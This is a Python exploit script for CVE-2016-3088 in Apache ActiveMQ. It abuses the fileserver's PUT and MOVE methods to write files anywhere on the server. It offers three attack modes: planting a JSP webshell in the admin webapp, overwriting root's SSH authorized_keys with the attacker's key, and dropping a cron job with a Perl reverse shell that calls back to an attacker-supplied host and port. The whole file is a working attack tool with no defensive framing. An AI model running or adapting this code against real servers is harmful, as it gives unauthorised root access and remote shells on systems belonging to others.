# -*- coding: utf-8 -*-
# author: seven


import logging
import argparse
import requests
from requests.auth import HTTPBasicAuth
import re
from bs4 import BeautifulSoup

logger = logging.getLogger('activemq')

def init_parser():
    parser = argparse.ArgumentParser(description="used for CVE-2016-3088")
    parser.add_argument("url",help="specify url for activemq,'127.0.0.1:8161'")
    parser.add_argument("-u","--username",help="specify username")
    parser.add_argument("-p","--password",help="specify password")
    parser.add_argument("--lhost",help="specify your listening host")
    parser.add_argument("--lport",help="specify your listening port")
    parser.add_argument("-m","--method",choices=['ssh','webshell','crontab'],default='webshell')
    args = parser.parse_args()
    return args

def init_logger():    
    logger.setLevel(logging.DEBUG)
    hdr = logging.StreamHandler()
    formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s')
    hdr.setFormatter(formatter)
    logger.addHandler(hdr)

def get_activemq_path(url,username,password):
    test_url = url+'/admin/test/systemProperties.jsp'
    res = requests.get(test_url,auth=HTTPBasicAuth(username,password))
    if res.status_code == 200:
        comp = re.compile('<td class="label">user.dir</td>.*?<td>(.*?)</td>',re.DOTALL)
        matches = comp.findall(res.text)
        if len(matches) > 0:
            return matches[0]
    raise Exception('GET ACTIVEMQ PATH FAIL')

def _upload_file(url,filename,data):
    url = url+'/fileserver/'+filename
    logger.debug(f'Try UPLOAD FILE:{filename}')
    res = requests.put(url,data=data)
    if res.status_code == 204:
        logger.debug(f'uploadfile {filename} success')
        return
    raise Exception(f'upload file {filename} fail')

def _move_file(filename,destination):
    try:
        logger.debug(f'TRY MOVE {filename} TO {destination}')
        res = requests.request(method='MOVE',url=f'{url}/fileserver/{filename}',headers={
            'Destination':f'file://{destination}'
        })
        if res.status_code == 204:
            logger.debug(f'MOVE FILE {filename} TO {destination} SUCCESS')
            return
    except:
        pass
    raise Exception(f'MOVE FILE {filename} TO {destination} FAIL')

def do_ssh(url):
    import os
    from pathlib import Path
    try:
        data = Path(os.environ['HOME']+'/.ssh/id_rsa.pub').read_text()
        _upload_file(url,'key.pub',data)
        _move_file('key.pub','/root/.ssh/authorized_keys')
        logger.info('TRY SSH LOGIN')
    except Exception as e:
        logger.info(e)

def do_crontab(url,lhost,lport):
    data = '''*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
    '''.format(lhost,lport)
    oriname= 'cron'
    try:
        logger.info(f'PLZ LISTEN {lport} AT {lhost}')
        _upload_file(url,oriname,data)
        _move_file(oriname,'/etc/cron.d/root')
        logger.info(f'CHECK REVERSE SHELL AT {lhost}:{lport}')
    except Exception as e:
        logger.info(e)

def do_webshell(url,dir_path,username,password):
    #1 upload webshell to fileserver
    from pathlib import Path
    data = Path('shell.jsp').read_text()
    oriname = 'zzzz'
    desname = oriname+'.jsp'
    _upload_file(url,oriname,data)
    #2 move webshell to admin file
    destination=f'{dir_path}/webapps/admin/{desname}'
    _move_file(oriname,destination)
    res = requests.get(f'{url}/admin/{desname}',auth=HTTPBasicAuth(username,password))
    if res.status_code == 200:
        logger.debug(f'{desname} EXIST')
        return f'{url}/admin/{desname}?pwd=023&i=ls'
    raise Exception(f'/admin/{desname} not exist')


if __name__ == "__main__":
    init_logger()
    args = init_parser()
    url = args.url
    if not url.startswith('http'):
        url = 'http://'+url
    try:
        if args.method == 'webshell':
            path = get_activemq_path(url,args.username,args.password)
            logger.debug('activemq dir:'+path)
            result = do_webshell(url,path,args.username,args.password)
            logger.info(f'webshell path:{result}')
        elif args.method == 'ssh':
            do_ssh(url)
        elif args.method == 'crontab':
            if not (args.lhost and args.lport):
                raise Exception('Please sepcify lhost and lport.')
            do_crontab(url,args.lhost,args.lport)
    except Exception as e:
        logger.debug(str(e))

        